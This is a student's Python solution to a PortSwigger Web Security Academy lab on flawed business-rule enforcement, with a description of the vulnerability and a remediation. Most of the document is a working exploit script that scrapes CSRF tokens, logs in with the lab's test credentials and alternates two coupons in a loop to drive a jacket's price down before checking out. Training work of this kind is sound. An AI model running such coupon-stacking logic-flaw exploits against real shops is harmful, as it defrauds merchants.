"""
Tristan Gomez - CS 595
Spring 2021

The code below solves the PortSwigger level: Flawed enforcement of business rules

Level Description:
    This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

    You can log in to your own account using the following credentials: wiener:peter 

Vulnerability Description:
    This level gives us the coupon "NEWCUST5" at the top of the page. At the bottom of the page
    is a form that when filled out and submitted correctly gives another coupon, "SIGNUP30". When
    in the cart, the site will not allow you to apply the same coupon multiple times in a row; however,
    the site's vulnerability becomes clear when both coupons are used. The client can alternate back 
    and forth between the two coupons, allowing them to be applied multiple times. This is used
    to lower the price of the desired jacket to under $100, which the client can then afford with their
    profile's cash credit. 
    

Remediation:
    Coupons should be associated with individual client accounts. In this way, when the client applies 
    a coupon it will be added to the back-end database that the client applied some specific coupon.
    Then if the user tries to apply another coupon, the back-end database can be queried to see if the 
    coupon has already been applied. If it has then the request can be blocked. 
"""

# We will need the "requests" library to make GET and POST requests programatically
# The "BeautifulSoup" and "re" libraries will be used to parse html pages for the
# coupon codes and CSRF tokens.
import requests
from bs4 import BeautifulSoup
import re


s = requests.Session()
site = "acc61f341ebf2930803d3c2a002a007d.web-security-academy.net"
site_url = f"https://{site}"
newsletter_url = f"https://{site}/sign-up"
login_url = f"https://{site}/login"
cart_url = f"https://{site}/cart"
coupon_url = f"https://{site}/cart/coupon"
checkout_url = f"https://{site}/cart/checkout"


"""
    Below, we are sending a GET request for the landing page so we can
    parse out the html to find the page's CSRF token to be used on the
    newsletter sign-up form submission.
"""
resp = s.get(site_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')


"""
    Below, I am using BeautifulSoup to get the first coupon code that I will
    need to solve the level.
"""
code_to_parse = soup.find("""p'""").text
firstCoupon = code_to_parse.replace("New customers use code at checkout: ", "")
firstCoupon = firstCoupon.strip()


"""
    Below, I am using the CSRF token extracted in the first step to form a 
    newsletter_data object which I will submit in a POST request to the sign-up
    for the newsletter form in order to get a second coupon code. In the response
    for the form submission, I will use "BeautifulSoup" to extract a script element
    containing the second coupon. Then using the "re" library, I will extract the coupon
    code from the script element.
"""
newsletter_data = {
    'csrf' : csrf,
    'email' : 'exploit@malicious.net'
}

resp = s.post(newsletter_url, data=newsletter_data)
soup = BeautifulSoup(resp.text,'html.parser')
script = soup.find_all('script')

coupon = re.findall("[A-Z]*[0-9]{2}", str(script[1]))
secondCoupon = coupon[0]


"""
    Below I am sending a GET request for the login page. I will use
    "BeautifulSoup" to parse the html response and extract the CSRF token
    used in the login form. I will package the CSRF token into a login_data
    object along with the given, default credentials.
"""
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

login_data = {
    'csrf':csrf,
    'username': 'wiener',
    'password': 'peter'
}

resp = s.post(login_url, login_data)
print(f"Login status: {resp.status_code}")

"""
    After logging in, I will add the jacket to the cart
    via a POST request.
"""
cart_data = {
    'productId': '1',
    'redir': 'PRODUCT',
    'quantity': '1'
}

resp = s.post(cart_url, data=cart_data)
print(f"Add to cart status: {resp.status_code}")

"""
    Below, I am sending a GET request for the /cart page.
    I will use "BeautifulSoup" to extract the CSRF token for
    the form which applies coupon codes from the html response.
"""
resp = s.get(cart_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

"""
    In the loop below, I am switching back and forth between the two
    coupon codes I have found applying them to lower the price of the jacket
    to a price which I can afford using my given store credit.
"""
i = 0
while(i < 8):
    if(i % 2 == 0):
        coupon_data = {
            'csrf': csrf,
            'coupon' : firstCoupon
        }   
        resp = s.post(coupon_url, data=coupon_data)
        print(f"apply coupon status: {resp.status_code}")
    else:
        coupon_data = {
            'csrf': csrf,
            'coupon' : secondCoupon
        } 
        s.post(coupon_url, data=coupon_data)
        print(f"apply coupon status: {resp.status_code}")
    i += 1

"""
    Once the loop has finished, the price of the jacket will have been lowered
    enough to where I can buy it with the given store credit. Now I can package up
    the same CSRF token used for applying coupons into a checkout_data object for use
    in the checkout form. Now, we submit the POST request to checkout and buy the jacket.
"""
checkout_data = { 'csrf': csrf}
resp = s.post(checkout_url, data=checkout_data)
print(f"checkout status: {resp}")